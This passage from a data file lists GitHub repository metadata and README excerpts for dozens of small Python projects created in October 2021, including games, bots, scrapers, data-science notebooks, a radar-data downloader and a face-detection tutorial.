pasta do seu projeto. Obrigado por usar  :D 
417334487;Jokenpo;https://github.com/thiagodevmaster/Jokenpo;;2021-10-15T01:35:08Z;0;0;0;Jokenpo Mini Game em Python sobre a brincadeira Pedra, Papel ou tesoura 
417368695;punctuation_bot;https://github.com/dylan-a-king/punctuation_bot;Python;2021-10-15T04:31:33Z;0;0;0;punctuation-bot this bot makes you use punctuation on discord. 
417393466;beautiful-atoms;https://github.com/superstar54/beautiful-atoms;Python;2021-10-15T06:39:03Z;0;0;0;Batoms  Batoms is a Python package for editing and rendering atoms and molecules objects using blender. A Python interface that allows for automating workflows. Features:  Model: space-filling, ball-stick, polyhedral, cavity and so on. File type: cif, xyz, cube, pdb, json, VASP-out and so on. Volumetric data (Isosurface) Animation GUI Flexible: Python script, run interactively or in background. High quality rendering:  3D models Free, Open Source: Easy to download and install. Cross-platform: (Linux, Windows, macOS)  Author  Xing Wang  xingwang1991@gmail.com  Dependencies  Python Blender ASE Scikit-image  How to use Please vist: https://batoms.readthedocs.io/en/latest/ 
417343642;pbformat;https://github.com/phantomSPH/pbformat;Python;2021-10-15T02:21:36Z;1;1;0;pbformat Python class to read the native binary format used in the Phantom Smoothed Particle Hydrodynamics code 
417324513;MultiplayerTicTacToe;https://github.com/MarcosMello/MultiplayerTicTacToe;Python;2021-10-15T00:43:33Z;0;0;0;MultiplayerTicTacToe - WIP Multiplayer TicTacToe that I'm trying to develop using only Python. Until now, I've only really worked on the GUI part of the Client. I've started to work on the Server, but stopped before doing anything significant. For this project I'm using:  Tkinter  
417392118;TwitterSentiment;https://github.com/3XMlimited/TwitterSentiment;Python;2021-10-15T06:33:11Z;0;0;0;TwitterSentiment 如何利用Python在Twitter上進行情緒分析 詳情可瀏覽我們的網頁- https://financetricksplace.com/利用python在twitter上的情緒分析/ 
417349195;whatsApp-spamBot;https://github.com/ankitrajbiswal/whatsApp-spamBot;Python;2021-10-15T02:48:50Z;0;0;0;whatsApp-spamBot This is a just a test project created using Python for Spamming WhatsApp This Project is not completed yet and few minor tweaks are to be made. They will be done soon. 
417324994;ti-basic;https://github.com/eaglerock1337/ti-basic;;2021-10-15T00:46:10Z;0;0;0;ti-basic A collection of programs written in TI-Basic and Python for TI calculators. about This is my repository of TI-Basic programs for my TI Calculators. Presently, I own a TI-83 and a TI-89, both of which I have recently rediscovered. My TI-83 was fortunate enough to have a working backup battery, which allowed me to recover all my programs that I wrote in high school, which are located in ti-83/classic. Unfortunately, My TI-89 programs were lost. My goals are to translate these programs (at least Lightsabers! and Stocks 2000) to work on the TI-89 (as I was starting to do back in high school), as well as create remastered versions of these programs by optimizing and bugfixing my old code. As far as new goals, I am looking to replace my TI-83 (which has a broken data port) with a new TI-84 CE Python, which I'm hoping to port my games over to as well. I anticipate the most extensive versions of my games to be written on the TI-84 CE Python, once I have fixed themm for the TI-83 and TI-89. 
417330595;walk-it-out;https://github.com/hakidehari/walk-it-out;Python;2021-10-15T01:15:49Z;0;0;0;walk-it-out Python package used to perform walk-forward analysis.  Specifically catered to finance. 
417366115;basicqueuesim;https://github.com/juli4nteo/basicqueuesim;Python;2021-10-15T04:16:44Z;0;0;0;basicqueuesim A basic ticket style queueing system simulator, built on Python and Streamlit 
417322122;expert-guacamole;https://github.com/achint227/expert-guacamole;Python;2021-10-15T00:30:11Z;0;0;0;
417359866;phone-webscraper;https://github.com/sawyers719/phone-webscraper;Python;2021-10-15T03:42:51Z;0;0;0;"phone-webscraper A python web-scraper program built with the Selenium module that searches Craigslist posts for phone numbers and saves them. What you need to run:  python pip selenium installed (in terminal: ""pip install selenium"")  How to use Program runs in terminal.  Enter category of posts to be searched. Enter how many pages of posts to be searched(each is 120) Enter how you would like to output the found phone numbers Image of inputs:   If you get an error now, that might mean the category you chose does not have enough posts. Program will run, speed depends on strength of your internet connection. Depending on what you chose previously, program will output list of phone numbers to file or terminal, or both. Image of outputs:  Just a cool, practical thing I made in my free time "
417374115;create_java_mapper;https://github.com/jyan1011/create_java_mapper;Python;2021-10-15T05:02:43Z;0;0;0;前言 本项目最初是由于工作需要，方便生成springboot项目的Mapper和Model类而写的一个工具类，现在经过优化后拿出来与各位分享，暂时只支持Mysql数据库。 使用要求  Python3环境 pymysql插件  # 需先安装python3环境与pip工具后在终端控制台执行以下命令来安装pymysql pip3 insall pymysql 使用方法 下载  Github下载：https://github.com/jyan1011/create_java_mapper/archive/master.zip 百度网盘下载：  配置文件  复制项目文件夹内的config.py.template文件，重命名为config.py 进行数据库配置，配置详细如下：  host = '127.0.0.1'  # 数据库地址 port = 3306 # 数据库端口，默认3306 user = 'dbuser' # 数据库用户名 pwd = 'dbpwd' # 数据库密码 db = 'test' # 数据库名称 # 指定导出的表，支持使用%通配，支持逗号分隔多表，留空默认查全表 # tables='tb_%,test_name' tables = '%'  # 指定导出目录，不指定默认输出到当前目录 path = ''  # 指定model文件导出的包，会在指定导出目录下按照包结构生成文件夹 model = 'com.cn.model' # model文件是否启用lombok @Data注解 lombok = True # 指定mapper文件导出的包，会在指定导出目录下按照包结构生成文件夹 mapper = 'com.cn.mapper' 运行  Mac、Linux系统下直接在工具目录的终端运行  python3 create_java_mapper.py  Windows系统可直接双击目录下的run.bat执行   问题反馈与打赏  如有疑问或发现问题，欢迎在本人小破站留言回复或直接提Issues 如果您觉得此工具对您有用，欢迎打赏，本人博客地址：Joeyの技术小栈  
417337128;PI-to-Nth-Digit;https://github.com/fu4ei-python/PI-to-Nth-Digit;Python;2021-10-15T01:48:39Z;0;0;0;PI-to-Nth-Digit Program that generates PI up to a user-specified number of decimal places. Coded in Python. Library used: Math 
417329219;Gdma-Burner;https://github.com/gdma2004/Gdma-Burner;Python;2021-10-15T01:08:17Z;0;0;0;"Gdma-Burner Simple python script to make writing .iso files to USB sticks using the ""dd"" command practical. How to use? Just open a new terminal and type python3 gdmaburner.py It will look like this:  P.S.: The program will only work if your pendrive is already formatted "
417342860;image-processing-with-Fourier-Transform;https://github.com/Nau3D/image-processing-with-Fourier-Transform;Jupyter Notebook;2021-10-15T02:17:39Z;0;0;0;image-processing-with-Fourier-Transform Simple python notebook showing how to filter an image with a Fourier Transform 
417393907;CajeroATM;https://github.com/MiguelTuring34/CajeroATM;Python;2021-10-15T06:40:57Z;0;0;0;
417351342;githubapitools;https://github.com/MoserMichael/githubapitools;Python;2021-10-15T02:59:50Z;0;0;0;"githubtools Some programs that make use of the python github api help text for makepr.py This program does the following steps; it assumes that the current directory is in a git tree.  for the --new-pr option:     1. Creates a feature branch for the current branch, and pushes the feature branch.     2. Opens a pull request, it is assumed that a continuous integration build is then triggered.     3. The program then waits that the continuous integration build for that pull request has completed.     4. At the end of the build, a sound is played, and the url with the build log is written to standard output.  for the --update-pr option:     1. Push the current state of local branch to the feature banch     2. The program waits that the continuous integration build for the top commit has completed.     3. At the end of the build, a sound is played, and the url with the build log is written to standard output.  for the --wait option:     2. The program waits that the continuous integration build for the top commit has completed.     3. At the end of the build, a sound is played, and the url with the build log is written to standard output.  Note that ou need to set the organization (-o option) in the case of a private repository.  This program allows you to do some sword fighting, while the continuous integration build is going on ;-(  This program assumes that the environment GITHUB_TOKEN is exported, and that it has the token of the current user. This program assumes the github api to be installed - pip install python-github-api   Push or update a pull request and wait for the continuous integration build to complete:   --new-pr, -n       create new pull request (default: False)   --update-pr, -u    update and push to existing pull request (default: False)   --wait, -w         wait for ongoing build of top commit to complete (default: False)   --org ORG, -o ORG  specify organization used to lookup the repository (default: )   --verbose, -v      trace all commands, verbose output (default: False)  help text for starcounter.py shows number of star of project owned by current github user It also compares the number of stars against the previous state, and reports any difference. The new state is then stored in the starcounter.data file.  This program assumes that the environment GITHUB_TOKEN is exported, and that it has the token of the current user. This program assumes the github api to be installed - pip install python-github-api  this is what we get when running it on my humble efforts here ;-) name: duckduckbang stars:  20 name: jq-illustrated stars:  20 name: kind-helper stars:  18 name: cppcombinator stars:  16 name: cstuff stars:  11 name: s9k stars:  11 name: pythonimportplayground stars:  5 name: myenv stars:  4 name: pygamewrap stars:  3 name: pythoncourse stars:  2 name: roget-thesaurus-parser stars:  2 name: gitblame stars:  1 name: k8explain stars:  1 name: opinionated-fortune-cow stars:  1 name: pprintex stars:  1 name: bloxroutehomework stars:  0 name: follow-kube-logs stars:  0 name: githubapitools stars:  0 name: github_pr_comments stars:  0 name: grpc-spring-boot-starter-utils stars:  0 name: ls-annotations stars:  0 name: microsofthomework stars:  0 name: my-notes stars:  0 name: scriptrunner-operator stars:  0 name: visual-python-strace stars:  0 name: zipit stars:  0 *** total stars:  116  "
417358649;Quiz_Game;https://github.com/lokesh2509/Quiz_Game;Python;2021-10-15T03:35:52Z;0;0;0;#Python – MCQ Quiz Game using Tkinter This is a simple multiple-choice quiz in python with Tkinter.  
417370630;Fibonacci-Sequence;https://github.com/fu4ei-python/Fibonacci-Sequence;Python;2021-10-15T04:43:00Z;0;0;0;Fibonacci-Sequence Program that generates the Fibonacci sequence to a user-specified number. Coded in Python. No libraries used. 
417337297;helper-excel-to-mongodb;https://github.com/propotion/helper-excel-to-mongodb;Python;2021-10-15T01:49:35Z;0;0;0;helper-excel-to-mongodb Python helper to push excel data into Mongodb using Pandas and PyMongo Install packages using requirements.txt Create your .env as below and store csv data in datafile.csv. Keep both the files in the same directory HOST_NAME=Your-IP-Address DATABASE_NAME=Your-DB-Name PORT=Your-Port-Number DB_USER=Your-Username DB_PASSWORD=Your-Password AUTHSOURCE=Your-AuthSource-DBName 
417325669;django-website-project;https://github.com/PatrickBruso/django-website-project;Python;2021-10-15T00:49:58Z;0;0;0;
417402428;batoms;https://github.com/superstar54/batoms;Python;2021-10-15T07:13:05Z;0;0;0;Beautiful Atoms Batoms is a Python package for editing and rendering atoms and molecules objects using blender. A Python interface that allows for automating workflows. Features:  Model: space-filling, ball-stick, polyhedral, cavity and so on. Supported File type: cif, xyz, cube, pdb, json, VASP-out and so on. Supported structure: ASE and Pymatgen Volumetric data (Isosurface) Animation GUI Flexible: Python script, run interactively or in background. High quality rendering:  3D models Free, Open Source: Easy to download and install. Cross-platform: (Linux, Windows, macOS)  Author  Xing Wang  xingwang1991@gmail.com  Dependencies  Python Blender ASE Scikit-image  How to use Please vist: https://beautiful-atoms.readthedocs.io/en/latest/ 
417373752;Excel_covid_data;https://github.com/jacekfigiel/Excel_covid_data;Python;2021-10-15T05:01:07Z;0;0;0;Excel_covid_data 
417339936;arp.Data.;https://github.com/CoffeeMay/arp.Data.;;2021-10-15T02:02:32Z;0;0;0;arp.Data. Python implementations of the k-modes and k-prototypes clustering algorithms, for clustering categorical data 
417399161;The-Wonkmy-Language;https://github.com/Wonkmy/The-Wonkmy-Language;Python;2021-10-15T07:01:35Z;0;0;0;
417373198;Satomi-name;https://github.com/Willpat1213/Satomi-name;Python;2021-10-15T04:57:38Z;1;1;0;若只用python的话，只需下载code.py文件即可 若使用的IDE是pycharm的话，则需下载所有文件然后用pycharm打开。 
417362096;level3-radar-downloader-tk;https://github.com/ksgwxfan/level3-radar-downloader-tk;;2021-10-15T03:55:38Z;0;0;0;"Level 3 Radar Downloader Tk The purpose of this Python Tkinter Zipapp is to expedite the retrieval and archival of the most-recent Level-III Radar data. Contents  Feature Highlights Requirements / Installation / Operation Defaults Management Filename Convention Note on Low Beam Angle Availability Data Origin Viewing the Files Roadmap Credits / Copyright  Feauture Highlights  Rapidly retrieve the most-recent Level-3 Radar Data Access to radar data for over 200 weather radars (159 WSR-88D; 45 TDWR), primarily found in the contiguous United States. Over 120 products are made accessible to download, with 112 being available for all WSR-88D Sites.  Many of these products are very similar, and just differ by scan angle   Maintain a ""Favorites"" radar site-list. This will streamline retrieval for your most-frequently accessed sites. Change the default (think 'start-up' or 'Home') radar site. Keeps track of the downloaded files, and indicates previous download of a file through changing the background color (but it does not prevent one from downloading again)  This download history can be deleted via the File, Options Menu. As typical products hold no more that 1 or 2 days worth of products, this should be done regularly    ⇧ back to Contents Requirements / Installation / Operation Requirements  Python (v3.5 or newer) Tkinter must be installed with Python  Installation  Simply download level3_radar_downloader_tk.pyz Place it into its own folder Run it. That's it!  Operation * For Convenience, these same instructions can be found within the Instructions / Overview option in the Help menu.  Select the radar site of interest, either from your favorites or the full list. Select the category. Select the product desired.  ** The radar site, category and product lists respond to arrow keys for movement; no need to press Enter/Return afterward.  Click Refresh URL List. (Shortcut Key: R)  Previously downloaded files will be highlighted in green. But the program does not prevent the user from downloading it again. It's there as a visual assist. A label above the clock will appear.  This label refers to the data in the URL box only. It does not reflect the currently-selected radar site or product. So even if you browse through the sites and products, it won't affect the URL List until you reload URLs via this button     Select the items you want to download. Click Get Selected URL(s). (Shortcut Key: U)   Items will be downloaded into corresponding folders based on their AWIPS Code (i.e. N0Q, N0U, etc).  ⇧ back to Contents Defaults Management  It is recommended to save your most-frequently used radar sites and use a default radar site. These features make accessing those sites much faster. Modifying the defaults can happen in two places within the app:  via Context Menu via options Menu   Your default settings will load upon every use of the app! Context Menu  Right-click on any site of interest and a context menu will appear, giving a description of the site (so you don't accidentally operate on the wrong one) From the Favorites context menu, only a removal option will be given. If changing the default site, a confirmation dialog will appear first.   Options Menu  Click File > Options. A menu will appear with essentially the same options as the context-menus, with an additional command to clear your favorites.    ⇧ back to Contents Filename Convention Upon retrieving a list of contained URL's, you'll notice a common, but confusing, file-name structure.  They'll be listed as an iteration of sn.NNNN where NNNN is typically a number between 0 and 300.  i.e. sn.0030, sn.0201, sn.last   These are the actual files which will be downloaded. To assist you, associated dates/times with those files will be listed. Natively, though they follow an iterative pattern, files higher in the sequence does not mean it is a newer file. There isn't any guaranteed order by filename. So the app does this for you. The results are re-sorted to display in time-descending order (newest to oldest). Upon downloading (but prior to saving), the data within the file is inspected to retrieve the proper WMO Header and Volume Time-Stamp. The file is then saved with a readable filename:  SSSS_WMOHDR_AAACCC_YYYYMMDDHHMM  SSSS is the radar's parent's Weather Forecast Office (WFO) callsign (i.e. KRNK) WMOHDR is the WMO Header (i.e. SDUS51) AAA is the AWIPS product code  Examples  N0Q is 0.5deg Base Reflectivity N0U is 0.5deg Base Velocity EET is Enhanced Echo Tops     CCC is the radar callsign (i.e. FCX) YYYYMMDDHHMM is the date-string, comprising of the Year, Month, Day, Hour, and Minute.   Example saved file name: KRNK_SDUS51_N0QFCX_202110090426 This file name structure is the formal standard, as far as I know. It's probably associated with the NEXRAD Information Dissemination Service (NIDS). I can't find any documentation to back that up though.    ⇧ back to Contents Note on Low Beam Angle Availability Most categories feature products of low beam angles.  NX_ products have a -0.2° angle NY_ products have a 0° angle; NZ_ products have a 0.3° angle  For a significant majority of WSR-88D sites, these products are not currently available. As such, the standard 0.5° angle product (N0_) will be auto-selected for categories supporting these low-beam products. ⇧ back to Contents Data Origin  The data comes from the Radar Product Central Collection Dissemination Service (RPCCDS) on the NWS Telecommunication Gateway.  In particular, the radar data is contained within the folder of https://tgftp.nws.noaa.gov/SL.us008001/DF.of/DC.radar/   This page is a great resource in explaining the folder structure of the data and interpretation of the products that are stored there:  https://www.weather.gov/tg/radfiles  Of note, this page is slightly outdated, as a lot of the legacy radar products (lower-quality, in general) are no longer maintained.     This PDF was referenced to assist in compiling the needed codes and descriptions:  https://www.weather.gov/media/tg/rpccds_radar_products.pdf   In general, you can expect the 300-or-so most-recent radar outputs available for each product.  ⇧ back to Contents Viewing the Files You'll need some other software for viewing or working with the files. Below are just a few options  NOAA's Weather Climate Toolkit (WCT) Unidata Integrated Data Viewer (IDV) McIDAS-V  ⇧ back to Contents Roadmap   Better management of download history by removing from the history files that aren't part of the most-recent data any longer  Comment the Python code (even though the general accessibility is that of an app, not .py files)  Investigate if a small image of radar imagery can appear to give reference to the file being inquired about  ⇧ back to Contents Credits / Copyright  Level 3 Radar Downloader Tk, © 2021, Kyle S. Gentry https://ksgwxfan.github.io for the clock update method, I did look it up, but do not remember where exactly I got the idea for the code  ⇧ back to Contents "
417395821;Slack-Bot;https://github.com/nfaltir/Slack-Bot;Python;2021-10-15T06:48:54Z;0;0;0;Python Slack Bot 🐍  Project Objective  Create a slack bot ✅ Connect python and slack bot ✅ Allow bot to fetch stock data using yfinance and post on slack ✅ Allow slack users to interact with bot (request stock data) 🔨 Automate bot to post stock reports at specific time 🔨   Install Python Packages pip3 install -r requirements.txt  Slack Config  Create a slack work space for testing https://api.slack.com/apps/ click on create an App name your app and select workspace. Click on the Slack Bot card, then click on Review Scopes to Add Select chat:write for now Click Install to workspace Get Oauth token, copy and paste it into a .env file in root folder of project  Output Figure: current state    
417322976;api-filmes-django;https://github.com/LucasAlmeidaSar/api-filmes-django;Python;2021-10-15T00:34:43Z;0;0;0;Api-Filmes Uma breve api com uma lista de filmes dos anos 81 a 96. Site: Api - Filmes 
417395835;Cherry-Personal-Assistant;https://github.com/CodeWithMavrick/Cherry-Personal-Assistant;Python;2021-10-15T06:48:59Z;0;0;0;
417413691;Exerc-ciosCursoEmVideo;https://github.com/Rafael-Arkeo/Exerc-ciosCursoEmVideo;Python;2021-10-15T07:51:52Z;0;0;0;
417318850;flat_db_to_hierarchial_one;https://github.com/Mohit-Ak/flat_db_to_hierarchial_one;Jupyter Notebook;2021-10-15T00:12:26Z;0;0;0;"Please consider this a semi-open book exercise. Feel free to consult reference materials you use, but please don't try to google this exact problem and copy & paste a solution from stack overflow or any other site. Suppose you are tasked with syncing data from two different sources, a product database, and a storefront. The product database also contains the product taxonomy, i.e., product categories. Each category has a name, can have at most one parent category, and can have zero or more children. The product database provides three pieces of information about a category: the categoryâ€™s id, itâ€™s parent categoryâ€™s id (if any), and the categoryâ€™s name. The storefront, though, has one limitation: a child category cannot be inserted before its parent category has been created. Our job is to write a function that can take a JSON string of categories provided by the product database and sort them in the optimal insertion order for the storefront so that no category insertion will result in an integrity error. The taxonomy for categories can be arbitrarily deep. The return value should also be a JSON string. Your function should take a JSON object representing the categories from the product database and provide as output a list of dictionaries sorted in the proper insertion order. There may be more than one optimal ordering of the categories, but you only have to provide an optimal ordering. You can assume:  The input will always be solvable (there will be no missing parents) The input will always be valid JSON in the format of the example below, with no additional data There may be more than one root category (a category with no parents)  This is a formatted JSON sample input, with one sample child (with both a parent and a child), one child with no children, and sample parent (with no parent) [   {     ""name"": ""Accessories"",     ""id"": 1,     ""parent_id"": 20,   },   {     ""name"": ""Watches"",     ""id"": 57,     ""parent_id"": 1   },   {     ""name"": ""Men"",     ""id"": 20,     ""parent_id"": null   } ] This is a formatted JSON sample solution for the input above: [   {     ""name"": ""Men"",     ""id"": 20,     ""parent_id"": null   },   {     ""name"": ""Accessories"",     ""id"": 1,     ""parent_id"": 20   },   {     ""name"": ""Watches"",     ""id"": 57,     ""parent_id"": 1   } ] When submitting your solution, please provide it as a file containing the function or method which will perform the proper calculations, so we can run tests against it. Below is the general format of an acceptable submission in Javascript: module.exports = function sortCategoriesForInsert (inputJson) {   // Your code happens...   ///   ... which calculates properJsonOutput   return properJsonOutput } Final notes on expected submissions:  Please use standard libraries where possible and limit the business logic to a one file submission. The order of key-value pairs within the JSON output does NOT matter. The whitespace of output JSON does NOT matter. Your solution should take into account that there may be tens of thousands of categories.  If you have any questions, let me know. Looking forward to your answer! "
417349426;everymac_scraper;https://github.com/blue2609/everymac_scraper;Python;2021-10-15T02:50:14Z;0;0;0;"Create virtual environment on your machine The easiest way is to setup a virtual environment on your machine to run the spider is to use either conda or mamba package manager and then run either:  mamba env create -f environment.yaml if you're using mamba package manager (the recommended way) conda env create -f environment.yaml if you're using conda package manager  The command above will create everymac_scraper mamba/conda virtual environment on your machine. You can then activate the virtual environment with conda activate everymac_scraper Running the spider In order to run the spider, navigate to the root directory of the project and then run scrapy crawl everymac_spider -o <some_output_filename>.csv You can see that there are 2 outputs already available inside output_csv folder:  macbook_pro.csv contains hardware spec details for all Apple MacBook Pro lineup (MacBook Pro 16"", MacBook Pro 15"", etc.) macbook.csv contains hardware spec details for all Apple Macbooks (Macbook 12"", Macbook, etc.)  "
417398507;Testing-Automated-;https://github.com/CodeInsideU/Testing-Automated-;Python;2021-10-15T06:59:20Z;0;0;0;Testing-Automated- This is my first project in which it is showing how to test a website using selenium in python. 
417380764;Graph-Search-Techniques;https://github.com/adityam3003/Graph-Search-Techniques;Python;2021-10-15T05:39:54Z;0;0;0;Graph-Search-Techniques This a python file with three Graph Search techniques namely Breadth First Search, Uniform Cost Search and A* Search. 
417391179;Chronic-Kidney-Disease;https://github.com/shiva17/Chronic-Kidney-Disease;Jupyter Notebook;2021-10-15T06:29:12Z;0;0;0;Chronic Kidney Disease Identify the factors causing chronic kidney disease. Build a model that can help to determine if a patient is suffering from kidney chronic disease or not. Documentation --> Data Set Characteristics: Multivariate --> Number of Instances: 400 --> Attribute Characteristics: Real --> Number of Attributes: 25 --> Associated Tasks: Classification Problem Statement a) Identify the factors causing chronic kidney disease. b) Build a model that can help to determine if a patient is suffering from kidney chronic disease or not. Installing Required Libraries pip install pandas pip install numpy pip install matplotlib pip install seaborn pip install scikit-learn pip install tqdm Authors  @ShivamKolhe  🚀 About Me I'm a Data Scientist ... Linkedin Profile: - @shivamkolhe-data-scientist 
417354243;kmr;https://github.com/Adarshkumar2212/kmr;Python;2021-10-15T03:13:14Z;0;0;0;Linear-Regression Here is the code to learn and implement the linear regression using the weather dataset and to predict the max temperature by training the model with the given min and max temp data.  Copy the python file and the dataset in the same folder. Istall the required libraries and packages Run the python file or the .ipynb file in Jupyter or any other python interpreter to the execution of the code. Here is the code to learn and implement the linear regression using the weather dataset and to predict the max temperature by training the model with the given min and max temp data. Copy the python file and the dataset in the same folder. Istall the required libraries and packages Run the python file or the .ipynb file in Jupyter or any other python interpreter to the execution of the code. 
417370942;Apparel-Classifier;https://github.com/saakethj/Apparel-Classifier;Python;2021-10-15T04:44:47Z;0;0;0;Apparel-Classifier Apparel Classifier is a neural network model that classifies grayscale images of size (28X28)pixels and provides which category of clothing like shirts, T-shirts, Handbags e.tc. 
417397104;Financial-Time-Series;https://github.com/Subham26/Financial-Time-Series;Python;2021-10-15T06:54:01Z;0;0;0;Financial-Time-Series Here, you will find python codes related to financial time-series data, and application of Deep Learning and Reinforcement Learning algorithms on it. 
417328284;Face-Detection;https://github.com/wanghao221/Face-Detection;Python;2021-10-15T01:03:21Z;1;1;1;"Face-Detection 仅使用 15 行 Python 代码就可以在你的系统上实现面部检测！ 🌊 作者主页：海拥 🌊 作者简介：🏆CSDN全栈领域优质创作者、🥇HDZ核心组成员、🥈蝉联C站周榜前十 🌊 粉丝福利：粉丝群 每周送四本书，每月送各种小礼品(搪瓷杯、抱枕、鼠标垫、马克杯等) 直接跳到末尾 去领资料 无论你是最近开始探索OpenCV还是已经使用它很长一段时间，在任何一种情况下，你都一定遇到过“人脸检测”这个词。随着机器变得越来越智能，它们模仿人类行为的能力似乎也在增加，而人脸检测就是人工智能的进步之一。 所以今天，我们将快速了解一下面部检测是什么，为什么它很有用，以及如何仅用 15 行代码就可以在你的系统上实际实现面部检测！ 让我们从了解面部检测开始。 什么是人脸检测？ 人脸检测是一种基于人工智能的计算机技术，能够识别和定位数码照片和视频中人脸的存在。简而言之，机器检测图像或视频中人脸的能力。 由于人工智能的重大进步，现在可以检测图像或视频中的人脸，无论光照条件、肤色、头部姿势和背景如何。 人脸检测是几个人脸相关应用程序的起点，例如人脸识别或人脸验证。如今，大多数数码设备中的摄像头都利用人脸检测技术来检测人脸所在的位置并相应地调整焦距。 那么人脸检测是如何工作的呢？ 很高兴你问了！任何人脸检测应用程序的主干都是一种算法（机器遵循的简单分步指南），可帮助确定图像是正图像（有脸的图像）还是负图像（没有人脸的图像）。 为了准确地做到这一点，算法在包含数十万张人脸图像和非人脸图像的海量数据集上进行了训练。这种经过训练的机器学习算法可以检测图像中是否有人脸，如果检测到人脸，还会放置一个边界框。 使用 OpenCV 进行人脸检测 计算机视觉是人工智能中最令人兴奋和最具挑战性的任务之一，有几个软件包可用于解决与计算机视觉相关的问题。OpenCV 是迄今为止最流行的用于解决基于计算机视觉的问题的开源库。 OpenCV 库的下载量超过1800 万次，活跃的用户社区拥有 47000 名成员。它拥有 2500 种优化算法，包括一整套经典和最先进的计算机视觉和机器学习算法，使其成为机器学习领域最重要的库之一。 图像中的人脸检测是一个简单的 3 步过程： 第一步：安装并导入open-cv模块： pip install opencv-python import cv2 import matplotlib.pyplot as plt # 用于绘制图像 第 2 步：将 XML 文件加载到系统中 下载 Haar-cascade Classifier XML 文件并将其加载到系统中： Haar-cascade Classifier 是一种机器学习算法，我们用大量图像训练级联函数。根据不同的目标对象有不同类型的级联分类器，这里我们将使用考虑人脸的分类器将其识别为目标对象。 你可以点击此处找到用于人脸检测的经过训练的分类器 XML 文件 # 加载级联 face_cascade = cv2.CascadeClassifier('haarcascade_frontalface_default.xml') 第 3 步：检测人脸并在其周围绘制边界框 使用 Haar-cascade 分类器中的 detectMultiScale() 函数检测人脸并在其周围绘制边界框： # 读取输入图像 img = cv2.imread('test.png')  # 检测人脸 faces = face_cascade.detectMultiScale(image = img, scaleFactor = 1.1, minNeighbors = 5)  # 在人脸周围绘制边界框 for (x, y, w, h) in faces:       cv2.rectangle(img, (x, y), (x+w, y+h), (255, 0, 0), 2)  # 显示图像中检测到的人脸数量 print(len(faces),""faces detected!"")  # 绘制检测到人脸的图像 finalimg = cv2.cvtColor(img, cv2.COLOR_RGB2BGR) plt.figure(figsize=(12,12)) plt.imshow(finalimg)  plt.axis(""off"") plt.show() detectMultiScale() 参数：   image： CV_8U 类型的矩阵，其中包含检测到对象的图像。 scaleFactor：指定在每个图像比例下图像尺寸减小多少的参数。 minNeighbors：参数指定每个候选矩形应该保留多少邻居。   可能需要调整一下这些值来获取最佳结果。  就像这样，你可以实现计算机视觉最独特的应用程序之一。可以在下面的GitHub找到整个人脸检测实现的详细代码模板。 https://github.com/wanghao221/Face-Detection 注意：本教程仅适用于图像文件中的人脸检测，而不适用于实时摄像机源或视频。 是不是感觉很棒？你刚刚学习了如何实现人工智能和机器学习最有趣的应用之一。希望你喜欢我的博客。谢谢阅读！ 🌊 面试题库：Java、Python、前端核心知识点大全和面试真题资料 🌊 电子图书：图灵程序丛书 300本、机械工业出版社6000册免费正版图书 🌊 办公用品：精品PPT模板几千套，简历模板一千多套 🌊 学习资料：2300套PHP建站源码，微信小程序入门资料 📣 注意： 扫码回复【进群】领书不迷路，群内 每位成员 我都会送一本。回复【资源】可获取上面的资料👇🏻👇🏻👇🏻**  "
417371467;2021_July_Panel_Holoviz;https://github.com/kcoleman80/2021_July_Panel_Holoviz;Jupyter Notebook;2021-10-15T04:47:41Z;0;0;0;2021_July_Panel_Holoviz Panel is an open-source Python library that lets you create custom interactive web apps and dashboards by connecting user-defined widgets to plots, images, tables, or text. Compared to other approaches, Panel is novel in that it supports nearly all plotting libraries, works just as well in a Jupyter notebook as on a standalone secure web server, uses the same code for both those cases, supports both Python-backed and static HTML/JavaScript exported applications, and can be used to develop rich interactive applications without tying your domain-specific code to any particular GUI or web tools. Panel makes it simple to make: Plots with user-defined controls Property sheets for editing parameters of objects in a workflow Control panels for simulations or experiments Custom data-exploration tools Dashboards reporting key performance indicators (KPIs) and trends Data-rich Python-backed web servers and anything in between Panel objects are reactive, immediately updating to reflect changes to their state, which makes it simple to compose viewable objects and link them into simple, one-off apps to do a specific exploratory task. The same objects can then be reused in more complex combinations to build more ambitious apps, while always sharing the same code that works well on its own. Panel lets you move the same code freely between an interactive Jupyter Notebook prompt and a fully deployable standalone server. That way you can easily switch between exploring your data, building visualizations, adding custom interactivity, sharing with non-technical users, and back again at any point, using the same tools and the same code throughout. Panel thus helps support your entire workflow, so that you never have to commit to only one way of using your data and your analyses, and don’t have to rewrite your code just to make it usable in a different way. In many cases, using Panel can turn projects that used to take weeks or months into something you finish on the same day you started, creating a full Python-backed deployed web service for your visualized data in minutes or hours without having to run a software development project or hand your work over to another team. 
417364518;COS-CM-BOT;https://github.com/Joentze/COS-CM-BOT;Python;2021-10-15T04:07:49Z;0;0;0;CMCOSBOT A Telegram bot for CM administrative purposes 
417379797;dankgrinder;https://github.com/vinniedaboi/dankgrinder;Python;2021-10-15T05:34:33Z;1;1;0;dankgrinder this is a python script that if you feed it tokens and a channel id it will automate everything, button clicking coming soon it was made in a short time so don't expect to high of quality. 
417367791;Geoscience_Multiverse;https://github.com/AotinianoZ/Geoscience_Multiverse;Jupyter Notebook;2021-10-15T04:26:24Z;1;1;0;"Geoscience Multiverse figmmgeology::conf 2021 workshop by A.Otiniano, J.Andrade Este repositorio es la base para el desarrollo del curso Geodatabase, Geo-Statistics, Machine Learning and Big Data: Applied to Geology (SQL – R – Qgis - Python)  🗓️ Octubre - Noviembre, 2021 🏃‍♂️ Comienza Domingo, 31 de Octubre 🎃 📗 Sabados - Domingos ⏰     14:00 - 18:00  Requerimientos Básicos:  No se requiere preparación 👏 Usaremos github y html para desarrollar el curso. Más detalles acerca del curso. Sí tienen alguna duda contacten a alonso.otiniano.z@uni.pe  Instructores Instructor  Alonso Otiniano @OtinianoAlonso Joseps Andrade @jacxter666   Co-instructores  Carlos Geraldino @CarlosCouch23 Roberth Saenz @roberthcero  Panorama El curso desarrolla desde los conceptos básicos de geodatabase (base de datos geoespacial) para entender la estructura y funcionamiento de base de datos espacial. Además se realiza el análisis estadístico exploratorio de aguas, suelo, rocas y sedimentos de drenaje, así como modelos estadísticos, geoestadísticos y de machine learning para su aplicación en recursos hídricos, geoquímica, hidroquímica, peligros geológicos, rock blasting todo esto enmarcado en la interactividad y desarrollo web. ¿Qué esperamos que aprendan?   Manejo y Estructura básica de base de datos.   Entendimiento de Big Data.   Conocer el ecosistema R y Rstudio.   Realizar Análisis Geoespacial en múltiples materias geológicas.   Entender el funcionamiento del Machine Learning en Geología.   Conocer los desarrollos actuales y prespectivas a futuro.   Instalaciones previas básicas son 